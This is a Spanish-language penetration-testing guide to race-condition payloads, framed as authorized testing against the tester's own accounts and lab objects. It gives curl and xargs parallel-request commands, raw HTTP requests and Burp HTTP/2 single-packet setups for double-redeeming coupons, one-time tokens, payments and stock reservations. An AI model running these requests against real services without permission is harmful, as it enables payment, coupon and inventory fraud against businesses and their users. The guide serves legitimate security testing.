# 🗡️ Race condition: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Línea base secuencial

```http
POST /api/test/{ID_PROPIO}/redeem HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}

# Repetir una segunda vez, después de observar el estado.
```

**Cuándo usarlo:** Confirmar la regla de un solo uso y el efecto persistido antes de probar concurrencia.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/race-conditions).


### Dos operaciones en paralelo

```bash
printf '1\n2\n' | xargs -P2 -I{} curl -sS -X POST \
  -H 'Authorization: Bearer {TOKEN_A}' \
  -H 'X-Test-Run: {}' \
  'https://{ORIGEN}/api/test/{ID_PROPIO_2}/redeem'
```

**Cuándo usarlo:** Dos requests sobre el mismo objeto propio; el marcador {} fuerza una ejecución por línea de entrada. Verificar el estado final, no solo los códigos HTTP.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/race-conditions).


## 🧭 Payloads por contexto

### Invariantes típicas que requieren dos cuentas propias

```text
Cupón: aplicar una vez → comparar saldo/descuento final.
Inventario simulado: última unidad → confirmar una sola reserva.
Alias único: A y B crean el mismo nombre → confirmar unicidad.
Token de un solo uso: A y B consumen el mismo token propio.
```

**Cuándo usarlo:** La respuesta 200 de ambas solicitudes no prueba doble efecto; leer el estado persistido.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Race%20Condition/README.md).


## 🔥 Payloads avanzados

### Grupo HTTP/2 de paquete único

```text
Burp Repeater → dos solicitudes propias en una pestaña de grupo.
Modo: Send group in parallel (HTTP/2 single-packet).
Control: el mismo par en secuencia y sobre otro objeto propio.
```

**Cuándo usarlo:** Usar solo en un entorno que permita esta técnica; registrar qué invariante se rompió.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/race-conditions).


## 🔬 Pruebas guiadas por escenario

### 1. Control secuencial A → B

**Objetivo:** Establecer la regla con un cupón u objeto de prueba reversible.

```bash
for n in 1 2; do curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer {TOKEN_A}" "https://{ORIGEN}/api/test/{ID_PROPIO}/redeem"; done
```

**Interpretación:** Registrar el estado final; dos respuestas 200 pueden corresponder a un solo efecto.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

### 2. Dos solicitudes paralelas

**Objetivo:** Comparar con el control secuencial y un objeto nuevo.

```bash
printf "%s\n" 1 2 | xargs -P2 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer {TOKEN_A}" "https://{ORIGEN}/api/test/{ID_PROPIO_2}/redeem"
```

**Interpretación:** Solo dos requests, si el programa lo permite; verificar doble efecto persistido.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

### 3. Mismo Idempotency-Key

**Objetivo:** Verificar deduplicación del mismo intento de pago simulado.

```http
POST /api/test-payments HTTP/1.1
Host: {ORIGEN}
Idempotency-Key: {CLAVE_PROPIA}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"amount":1,"currency":"TEST"}
```

**Interpretación:** Repetir la misma solicitud en entorno de pruebas; debe producir una sola operación lógica.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

### 4. Claves de idempotencia diferentes

**Objetivo:** Distinguir deduplicación de una regla que impide duplicados por negocio.

```text
Solicitud A: Idempotency-Key: {K1}
Solicitud B: Idempotency-Key: {K2}
Mismo objeto propio de prueba
```

**Interpretación:** Dos claves pueden autorizar dos operaciones legítimas; la invariante del negocio decide si hay fallo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

### 5. Dos endpoints sobre el mismo estado

**Objetivo:** Buscar ventana multietapa con recursos propios.

```text
En grupo paralelo de Burp Repeater:
POST /api/test/{ID_PROPIO}/confirm
POST /api/test/{ID_PROPIO}/cancel
```

**Interpretación:** El estado final debe satisfacer una transición válida. No usar pedidos o pagos reales.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

### 6. Sincronización HTTP/2 en laboratorio

**Objetivo:** Reducir jitter de red al confirmar una carrera conocida.

```text
Burp Repeater → Send group in parallel (HTTP/2 single-packet) → 2 requests a {LAB_AISLADO}
```

**Interpretación:** Comparar con ejecución secuencial. La técnica es de laboratorio y depende del soporte HTTP/2.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition).

### 7. Lectura entre pasos

**Objetivo:** Observar estado parcial sin modificar terceros.

```http
GET /api/test/{ID_PROPIO}/status HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Consultar durante una transición propia y distinguir estado transitorio esperado de un permiso indebido.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

### 8. Última unidad de stock simulado

**Objetivo:** Verificar una invariante de inventario con dos compras ficticias.

```text
Inventario propio inicial: 1
En paralelo: POST /api/test-cart/{ID_A}/reserve y POST /api/test-cart/{ID_B}/reserve
```

**Interpretación:** Conservar solo reservas de laboratorio. Dos confirmaciones con inventario final negativo prueban la carrera.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

### 9. Dos registros del mismo alias

**Objetivo:** Probar unicidad de un identificador creado por dos cuentas propias.

```text
En paralelo: POST /api/test-aliases {"alias":"canary-{NONCE}"} desde A y B
```

**Interpretación:** Confirmar estado persistido y política de unicidad; dos respuestas 201 no bastan.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

### 10. Reenvío rápido tras caducidad

**Objetivo:** Evaluar ventana entre validar y usar un token de prueba.

```text
Token propio de un solo uso: solicitud A y B en paralelo antes de confirmar estado final.
```

**Interpretación:** Solo con token propio y dos peticiones. Reportar si ambas ejecutan el efecto de un solo uso.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
